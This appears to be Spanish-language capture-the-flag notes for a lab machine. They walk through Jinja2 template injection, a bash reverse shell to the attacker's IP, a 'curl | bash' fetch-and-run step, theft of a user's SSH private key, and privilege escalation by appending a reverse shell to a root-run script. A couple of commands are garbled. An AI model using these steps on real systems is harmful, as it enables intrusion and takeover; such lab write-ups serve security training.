
### RECONOCIMIENTO

Comenzamos con [[Nmap]].

Encontramos el puerto 80 (tiene un servidor web corriendo).

### PÁGINA WEB

Encontramos un lugar en el que puedo escribir cosas, vamos a hacer pruebas, pero cómo nos devuelve nada, no parece interesante.

Parece que esta herramienta es un editor de fotos.

Podemos pulsar sobre el enlace que nos dejan, y... ¡Vaya, parece que el enlace no carga ([[Virtual hosting]])!.

Modificamos el [[/etc/hosts]].

En el "image.late.htb", parece que estamos ante una web que convierte un texto en una imagen, vamos a hacer una prueba:

Cuándo tenemos una página web, que si nosotros metemos un código, y sea misma página nos lo reporta de alguna manera, pensamos en la [[ssti]].

### SSTI

En github tenemos un repositorio que se llama "payloads all the things".

Pues buscamos la de "ssti" y en el repo, buscamos la de "[[Server Side Template Inyection]]". 

En este caso, usaremos la de Python - Jinja2, ya que la página usa Flask (que es de Python). 

Inscrustamos una línea de esas de código, le echamos un pantallazo y comprobamos a ver si la página nos hace el cambio (y así, podríamos afirmar que se puede hacer control remoto).

Cómo sabemos que podemos incrustar código, incrustamos el mítico:

>#!/bin/bash
>bash -i >& /dev/tcp/myIP (eth0)/port 0>&1

Eso dentro de un archivo, y lo subimos a un servidor python, entonces, junto con lo del Jinja2, en el código de esa vulnerabilidad tenemos que hacer que nos descargue ese archivo que queremos que nos descargue y que lo abra con bash:

>curl myIP | bash

## DENTRO DE LA MÁQUINA

>[[script /dev/null -c bash]]

Para ponerla aún mejor:

> `control + z`
> [[stty -raw echo; fg]]
> `reset xterm`
> [[export TERM=Xterm]]

Y ahora tenemos la shell más interactica.

### ESCALADA DE PRIVILEGIOS

**Primera alternativa:**
- `sudo -l`
- Unas veces funciona, otras no.

**Segunda alternativa:**
- [[find]] / -user userName 2>/dev/null | grep [[.sh]]
- Encontramos un archivo en el directorio sbin que podría ser interesante (ssh-alert.sh).
- No podemos modificarlo, pero podemos añadir información al final del documento, por ejemplo.
- Vemos que ese script dice algo de SSH (sospechamos).

Hacemos:
>	`cat ~/.ssh/id_rsa`
>	
>	Si yo copio en mi ordenador esta clave, yo luego puedo entrar sin proporcionar contraseña por vía SSH, aprovechándome del puerto 22 (que sabemos que está ya abierto).

La copiamos y la pegamos en un archivo de nuestra máquina virtual, y la llamamos, por ejemplo, id_rsa.

En la máquina víctima, vamos a añadir texto (sin nano, sin vim...):
> 	`echo "bash -i >& /dev/tcp/myIP (eth0)/port 0>&1" >> ssh-alert.sh`

Y nos ponemos en escucha por otra ventana de nuestra máquina virtual...

Antes de ponernos en escucha, tenemos que darle permisos a nuestra archivo para poder iniciar sesión por SSH (desde nuestra máquina):
> `sudo chmod 600 id_rsa`

Ahora podemos conectarnos por SSH (desde nuestra máquina):
> `sudo svc_acc@10.10.11.156 -i id_rsa`

Entonces, por el puerto por el que estábamos en escucha, hemos obtenido el acceso a root.




